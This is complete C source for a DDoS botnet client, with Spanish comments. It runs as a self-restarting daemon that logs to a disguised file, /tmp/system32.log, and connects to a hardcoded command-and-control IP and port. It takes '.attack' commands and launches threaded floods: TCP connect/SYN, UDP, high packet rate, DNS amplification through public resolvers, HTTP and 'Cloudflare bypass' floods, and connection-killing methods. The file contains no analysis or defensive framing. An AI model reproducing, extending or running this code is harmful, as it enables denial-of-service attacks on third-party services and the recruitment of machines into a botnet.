#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/resource.h>

#define CNC_IP "172.96.140.62"
#define CNC_PORT 14037

// ========== CONFIGURACIÓN ==========
int running = 1;
int cpu_cores = 1;

void log_msg(const char* msg) {
    FILE* f = fopen("/tmp/system32.log", "a");
    if(f) {
        fprintf(f, "[%ld] %s\n", time(NULL), msg);
        fclose(f);
    }
}

void rand_str(char *dest, int length) {
    const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    for (int i = 0; i < length; i++) {
        dest[i] = charset[rand() % (sizeof(charset) - 1)];
    }
}

void optimize_system() {
    cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);
    log_msg("System optimized");
}

// ========== TCP (Standard SYN/ACK flood) ==========
void* tcp_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    log_msg("TCP attack started");
    
    time_t end = time(NULL) + duration;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    while(running && time(NULL) < end) {
        for(int i = 0; i < 500; i++) { // 500 conexiones por ciclo
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if(sock < 0) continue;
            
            // Configuración estándar SYN flood
            int yes = 1;
            setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
            fcntl(sock, F_SETFL, O_NONBLOCK);
            
            // Puerto fuente aleatorio
            struct sockaddr_in src = {0};
            src.sin_family = AF_INET;
            src.sin_port = htons(1024 + (rand() % 64511));
            src.sin_addr.s_addr = INADDR_ANY;
            bind(sock, (struct sockaddr*)&src, sizeof(src));
            
            connect(sock, (struct sockaddr*)&target, sizeof(target));
            
            // Enviar algunos datos
            if(rand() % 3 == 0) {
                char data[128];
                rand_str(data, sizeof(data));
                send(sock, data, sizeof(data), MSG_NOSIGNAL | MSG_DONTWAIT);
            }
            
            close(sock);
        }
        usleep(1000);
    }
    
    log_msg("TCP finished");
    free(params);
    return NULL;
}

// ========== UDP (Massive UDP packets) ==========
void* udp_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    log_msg("UDP attack started");
    
    time_t end = time(NULL) + duration;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    // Pool de sockets UDP
    int socks[50];
    for(int i = 0; i < 50; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if(socks[i] >= 0) {
            int buf_size = 2 * 1024 * 1024;
            setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        }
    }
    
    while(running && time(NULL) < end) {
        for(int i = 0; i < 50; i++) {
            if(socks[i] < 0) continue;
            
            // Paquetes grandes (1024 bytes)
            char buffer[1024];
            rand_str(buffer, sizeof(buffer));
            
            sendto(socks[i], buffer, sizeof(buffer), 
                  MSG_NOSIGNAL | MSG_DONTWAIT,
                  (struct sockaddr*)&target, sizeof(target));
        }
        usleep(1000);
    }
    
    for(int i = 0; i < 50; i++) {
        if(socks[i] >= 0) close(socks[i]);
    }
    
    log_msg("UDP finished");
    free(params);
    return NULL;
}

// ========== DNS (DNS Amplification) ==========
void* dns_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    log_msg("DNS amplification attack started");
    
    // DNS siempre usa puerto 53
    time_t end = time(NULL) + duration;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(53);
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    // Consulta DNS que genera respuesta grande (ANY query)
    unsigned char dns_query[] = {
        0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0xFF, 0x00,
        0x01, 0x00, 0x01
    };
    
    // Servidores DNS públicos para reflejar
    struct sockaddr_in dns_servers[] = {
        {.sin_addr.s_addr = inet_addr("8.8.8.8")},
        {.sin_addr.s_addr = inet_addr("1.1.1.1")},
        {.sin_addr.s_addr = inet_addr("9.9.9.9")},
        {.sin_addr.s_addr = inet_addr("208.67.222.222")}
    };
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock < 0) {
        free(params);
        return NULL;
    }
    
    // Spoof source IP como la víctima (si el ISP lo permite)
    struct sockaddr_in src_addr;
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(53);
    src_addr.sin_addr.s_addr = inet_addr(ip);
    
    bind(sock, (struct sockaddr*)&src_addr, sizeof(src_addr));
    
    while(running && time(NULL) < end) {
        for(int i = 0; i < 4; i++) {
            sendto(sock, dns_query, sizeof(dns_query), 0,
                   (struct sockaddr*)&dns_servers[i], sizeof(struct sockaddr_in));
        }
        usleep(10000); // 10ms
    }
    
    close(sock);
    log_msg("DNS finished");
    free(params);
    return NULL;
}

// ========== HTTPBYPASS (Bypass HTTP protections) ==========
void* httpbypass_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    log_msg("HTTPBYPASS attack started");
    
    time_t end = time(NULL) + duration;
    
    const char* user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "curl/7.88.1",
        "python-requests/2.31.0"
    };
    
    while(running && time(NULL) < end) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) {
            usleep(50000);
            continue;
        }
        
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        inet_pton(AF_INET, ip, &target.sin_addr);
        
        struct timeval tv = {2, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        if(connect(sock, (struct sockaddr*)&target, sizeof(target)) == 0) {
            const char* ua = user_agents[rand() % 4];
            
            char request[1024];
            snprintf(request, sizeof(request),
                    "GET / HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "User-Agent: %s\r\n"
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    "Accept-Language: en-US,en;q=0.5\r\n"
                    "Accept-Encoding: gzip, deflate\r\n"
                    "Connection: keep-alive\r\n"
                    "Upgrade-Insecure-Requests: 1\r\n"
                    "\r\n",
                    ip, ua);
            
            send(sock, request, strlen(request), MSG_NOSIGNAL);
            
            char buffer[2048];
            recv(sock, buffer, sizeof(buffer), MSG_DONTWAIT);
            
            usleep(30000 + (rand() % 70000));
        }
        
        close(sock);
        usleep(10000 + (rand() % 40000));
    }
    
    log_msg("HTTPBYPASS finished");
    free(params);
    return NULL;
}

// ========== CFBYPASS (CloudFlare Bypass) ==========
void* cfbypass_attack(void* arg) {
    // Usa HTTPBYPASS con headers adicionales para CloudFlare
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    log_msg("CFBYPASS attack started");
    
    // CFBYPASS es básicamente HTTPBYPASS mejorado
    return httpbypass_attack(arg);
}

// ========== PPS (High packets per second) ==========
void* pps_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    log_msg("PPS attack started");
    
    time_t end = time(NULL) + duration;
    
    // Múltiples sockets UDP para máximo PPS
    int socks[30];
    for(int i = 0; i < 30; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if(socks[i] >= 0) {
            int buf_size = 1024 * 1024 * 10;
            setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        }
    }
    
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    // Paquete pequeño para máximo PPS
    char small_packet[64];
    memset(small_packet, 'X', sizeof(small_packet));
    
    while(running && time(NULL) < end) {
        for(int i = 0; i < 30; i++) {
            if(socks[i] < 0) continue;
            
            // Ráfaga masiva
            for(int burst = 0; burst < 500; burst++) {
                sendto(socks[i], small_packet, sizeof(small_packet), 
                      MSG_NOSIGNAL | MSG_DONTWAIT,
                      (struct sockaddr*)&target, sizeof(target));
            }
        }
        usleep(100);
    }
    
    for(int i = 0; i < 30; i++) {
        if(socks[i] >= 0) close(socks[i]);
    }
    
    log_msg("PPS finished");
    free(params);
    return NULL;
}

// ========== UDPBYPASS (Bypass UDP firewalls) ==========
void* udpbypass_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    log_msg("UDPBYPASS attack started");
    
    time_t end = time(NULL) + duration;
    
    // Pool de sockets UDP
    int sock_pool[50];
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    // Inicializar pool con configuraciones variadas
    for(int i = 0; i < 50; i++) {
        sock_pool[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if(sock_pool[i] >= 0) {
            int flags = 1;
            setsockopt(sock_pool[i], SOL_SOCKET, SO_REUSEADDR, &flags, sizeof(flags));
            
            // Puerto fuente aleatorio
            struct sockaddr_in src_addr;
            memset(&src_addr, 0, sizeof(src_addr));
            src_addr.sin_family = AF_INET;
            src_addr.sin_port = htons(32768 + (rand() % 32768));
            src_addr.sin_addr.s_addr = INADDR_ANY;
            
            bind(sock_pool[i], (struct sockaddr*)&src_addr, sizeof(src_addr));
            connect(sock_pool[i], (struct sockaddr*)&target, sizeof(target));
        }
    }
    
    while(running && time(NULL) < end) {
        for(int i = 0; i < 50; i++) {
            if(sock_pool[i] < 0) continue;
            
            // Variar tamaño de paquete
            int packet_size = 500 + (rand() % 1000);
            char buffer[packet_size];
            rand_str(buffer, packet_size);
            
            send(sock_pool[i], buffer, packet_size, MSG_NOSIGNAL | MSG_DONTWAIT);
        }
        usleep(rand() % 10);
    }
    
    for(int i = 0; i < 50; i++) {
        if(sock_pool[i] >= 0) close(sock_pool[i]);
    }
    
    log_msg("UDPBYPASS finished");
    free(params);
    return NULL;
}

// ========== TCPBYPASS (Bypass TCP firewalls) ==========
void* tcpbypass_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    log_msg("TCPBYPASS attack started");
    
    time_t end = time(NULL) + duration;
    
    // Pool de conexiones persistentes
    int conn_pool[20];
    struct sockaddr_in targets[20];
    
    for(int i = 0; i < 20; i++) {
        conn_pool[i] = -1;
        targets[i].sin_family = AF_INET;
        targets[i].sin_port = htons(port);
        inet_pton(AF_INET, ip, &targets[i].sin_addr);
    }
    
    while(running && time(NULL) < end) {
        for(int i = 0; i < 20; i++) {
            // Crear/reusar conexiones
            if(conn_pool[i] < 0 || (rand() % 100) == 0) {
                if(conn_pool[i] >= 0) close(conn_pool[i]);
                
                conn_pool[i] = socket(AF_INET, SOCK_STREAM, 0);
                if(conn_pool[i] < 0) continue;
                
                int flags = 1;
                setsockopt(conn_pool[i], SOL_SOCKET, SO_REUSEADDR, &flags, sizeof(flags));
                setsockopt(conn_pool[i], SOL_SOCKET, SO_KEEPALIVE, &flags, sizeof(flags));
                
                fcntl(conn_pool[i], F_SETFL, O_NONBLOCK);
                
                // Puerto fuente aleatorio
                struct sockaddr_in src_addr;
                memset(&src_addr, 0, sizeof(src_addr));
                src_addr.sin_family = AF_INET;
                src_addr.sin_port = htons(32768 + (rand() % 32768));
                src_addr.sin_addr.s_addr = INADDR_ANY;
                
                bind(conn_pool[i], (struct sockaddr*)&src_addr, sizeof(src_addr));
                connect(conn_pool[i], (struct sockaddr*)&targets[i], sizeof(struct sockaddr_in));
            }
            
            // Enviar datos periódicamente
            if(rand() % 10 == 0) {
                char data[128];
                rand_str(data, sizeof(data));
                send(conn_pool[i], data, sizeof(data), MSG_NOSIGNAL | MSG_DONTWAIT);
            }
        }
        usleep(1 + (rand() % 20));
    }
    
    for(int i = 0; i < 20; i++) {
        if(conn_pool[i] >= 0) close(conn_pool[i]);
    }
    
    log_msg("TCPBYPASS finished");
    free(params);
    return NULL;
}

// ========== TCPKILLER (Kill active TCP connections) ==========
void* tcpkiller_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    log_msg("TCPKILLER attack started");
    
    time_t end = time(NULL) + duration;
    
    while(running && time(NULL) < end) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if(fd < 0) {
            usleep(1000);
            continue;
        }
        
        // Configuración agresiva de cierre
        struct linger lin;
        lin.l_onoff = 1;
        lin.l_linger = 0;
        setsockopt(fd, SOL_SOCKET, SO_LINGER, &lin, sizeof(lin));
        
        fcntl(fd, F_SETFL, O_NONBLOCK);
        
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        inet_pton(AF_INET, ip, &target.sin_addr);
        
        // Puerto fuente aleatorio
        struct sockaddr_in src_addr;
        memset(&src_addr, 0, sizeof(src_addr));
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(49152 + (rand() % 16384));
        src_addr.sin_addr.s_addr = INADDR_ANY;
        
        bind(fd, (struct sockaddr*)&src_addr, sizeof(src_addr));
        connect(fd, (struct sockaddr*)&target, sizeof(target));
        
        // Enviar datos corruptos
        if(rand() % 3 == 0) {
            char corrupt[16];
            memset(corrupt, 0xFF, sizeof(corrupt));
            send(fd, corrupt, sizeof(corrupt), MSG_NOSIGNAL);
        }
        
        // Cierre agresivo
        shutdown(fd, SHUT_RDWR);
        close(fd);
        
        usleep(1000);
    }
    
    log_msg("TCPKILLER finished");
    free(params);
    return NULL;
}

// ========== TCPMIX (Mix of advanced TCP techniques) ==========
void* tcpmix_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    log_msg("TCPMIX attack started");
    
    time_t end = time(NULL) + duration;
    
    while(running && time(NULL) < end) {
        for(int thread = 0; thread < 10; thread++) {
            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if(fd < 0) continue;
            
            // Configuraciones avanzadas mixtas
            int flags = 1;
            setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &flags, sizeof(flags));
            setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &flags, sizeof(flags));
            
            fcntl(fd, F_SETFL, O_NONBLOCK);
            
            // Variar TTL
            int ttl = 64 + (rand() % 64);
            setsockopt(fd, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));
            
            struct sockaddr_in target;
            target.sin_family = AF_INET;
            target.sin_port = htons(port);
            inet_pton(AF_INET, ip, &target.sin_addr);
            
            // Puerto fuente aleatorio
            struct sockaddr_in src_addr;
            memset(&src_addr, 0, sizeof(src_addr));
            src_addr.sin_family = AF_INET;
            src_addr.sin_port = htons(1024 + (rand() % 64512));
            src_addr.sin_addr.s_addr = INADDR_ANY;
            
            bind(fd, (struct sockaddr*)&src_addr, sizeof(src_addr));
            connect(fd, (struct sockaddr*)&target, sizeof(target));
            
            // Enviar datos variados
            if(rand() % 10 == 0) {
                char buf[64];
                rand_str(buf, sizeof(buf));
                send(fd, buf, sizeof(buf), MSG_NOSIGNAL | MSG_DONTWAIT);
            }
            
            close(fd);
        }
        usleep(500);
    }
    
    log_msg("TCPMIX finished");
    free(params);
    return NULL;
}

// ========== HTTP (Layer 7 HTTP attack) ==========
void* http_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    log_msg("HTTP attack started");
    
    // HTTP attack es básicamente HTTPBYPASS pero más agresivo
    return httpbypass_attack(arg);
}

// ========== HANDLE COMMANDS ==========
void handle_command(int sock, char* buffer) {
    log_msg(buffer);
    
    if(strstr(buffer, ".attack")) {
        char* cmd = strstr(buffer, ".attack");
        if(cmd) {
            char method[32], ip[64];
            int port, duration;
            
            int parsed = sscanf(cmd, ".attack %31s %63s %d %d", 
                               method, ip, &port, &duration);
            
            if(parsed == 4) {
                char log[256];
                snprintf(log, sizeof(log), "Attack: %s %s:%d %ds", method, ip, port, duration);
                log_msg(log);
                
                char params[256];
                snprintf(params, sizeof(params), "%s %d %d", ip, port, duration);
                char* params_copy = strdup(params);
                
                if(params_copy) {
                    pthread_t thread;
                    void* (*attack_func)(void*) = NULL;
                    
                    // MAPEAR TODOS LOS MÉTODOS EXACTAMENTE COMO TU CNC
                    if(strcasecmp(method, "TCP") == 0) {
                        attack_func = tcp_attack;
                    }
                    else if(strcasecmp(method, "UDP") == 0) {
                        attack_func = udp_attack;
                    }
                    else if(strcasecmp(method, "DNS") == 0) {
                        attack_func = dns_attack;
                    }
                    else if(strcasecmp(method, "HTTPBYPASS") == 0) {
                        attack_func = httpbypass_attack;
                    }
                    else if(strcasecmp(method, "CFBYPASS") == 0) {
                        attack_func = cfbypass_attack;
                    }
                    else if(strcasecmp(method, "PPS") == 0) {
                        attack_func = pps_attack;
                    }
                    else if(strcasecmp(method, "UDPBYPASS") == 0) {
                        attack_func = udpbypass_attack;
                    }
                    else if(strcasecmp(method, "TCPBYPASS") == 0) {
                        attack_func = tcpbypass_attack;
                    }
                    else if(strcasecmp(method, "TCPKILLER") == 0) {
                        attack_func = tcpkiller_attack;
                    }
                    else if(strcasecmp(method, "TCPMIX") == 0) {
                        attack_func = tcpmix_attack;
                    }
                    else if(strcasecmp(method, "HTTP") == 0) {
                        attack_func = http_attack;
                    }
                    
                    if(attack_func) {
                        pthread_create(&thread, NULL, attack_func, params_copy);
                        pthread_detach(thread);
                        log_msg("Attack thread started");
                    } else {
                        free(params_copy);
                        log_msg("Unknown attack method");
                    }
                }
            }
        }
    }
    else if(strstr(buffer, ".stop")) {
        running = 0;
        log_msg("Stop command received");
        sleep(1);
        running = 1;
    }
    else if(strstr(buffer, "PING")) {
        send(sock, "PONG\n", 5, 0);
    }
    else if(strstr(buffer, "BOT_ID")) {
        log_msg("Bot ID assigned");
    }
}

// ========== CONEXIÓN CNC ==========
void run_bot_logic() {
    log_msg("Bot starting...");
    optimize_system();
    srand(time(NULL));
    
    while(running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) {
            sleep(5);
            continue;
        }
        
        struct timeval tv = {10, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(CNC_PORT);
        inet_pton(AF_INET, CNC_IP, &server.sin_addr);
        
        if(connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
            char err_msg[256];
            snprintf(err_msg, sizeof(err_msg), "Connect failed: %s", strerror(errno));
            log_msg(err_msg);
            close(sock);
            sleep(10);
            continue;
        }
        
        log_msg("Connected to CNC");
        send(sock, "HEARTBEAT:x86_64\n", 16, MSG_NOSIGNAL);
        
        // Esperar BOT_ID
        fd_set read_fds;
        struct timeval timeout = {5, 0};
        FD_ZERO(&read_fds);
        FD_SET(sock, &read_fds);
        
        if(select(sock + 1, &read_fds, NULL, NULL, &timeout) > 0) {
            char init_buf[256];
            int n = recv(sock, init_buf, sizeof(init_buf)-1, 0);
            if(n > 0) {
                init_buf[n] = 0;
                if(strstr(init_buf, "BOT_ID")) {
                    log_msg("Bot registered successfully");
                }
            }
        }
        
        // Bucle principal
        char buffer[1024];
        time_t last_heartbeat = time(NULL);
        tv.tv_sec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        
        while(running) {
            if(time(NULL) - last_heartbeat > 30) {
                send(sock, "PONG\n", 5, MSG_NOSIGNAL);
                last_heartbeat = time(NULL);
            }
            
            memset(buffer, 0, sizeof(buffer));
            int n = recv(sock, buffer, sizeof(buffer)-1, MSG_DONTWAIT);
            
            if(n > 0) {
                buffer[n] = 0;
                handle_command(sock, buffer);
            } else if(n == 0) {
                log_msg("CNC disconnected");
                break;
            } else if(errno != EAGAIN && errno != EWOULDBLOCK) {
                log_msg("Receive error");
                break;
            }
            
            usleep(100000);
        }
        
        close(sock);
        log_msg("Disconnected, reconnecting in 3s...");
        sleep(3);
    }
}

// ========== MAIN ==========
int main() {
    if(fork() > 0) return 0;
    setsid();
    
    while(1) {
        log_msg("=== SYSTEM32 BOT STARTED ===");
        
        pid_t pid = fork();
        if(pid == 0) {
            run_bot_logic();
            exit(0);
        } else {
            int status;
            waitpid(pid, &status, 0);
            log_msg("Bot stopped. Restarting in 2 seconds...");
            sleep(2);
        }
    }
    
    return 0;
}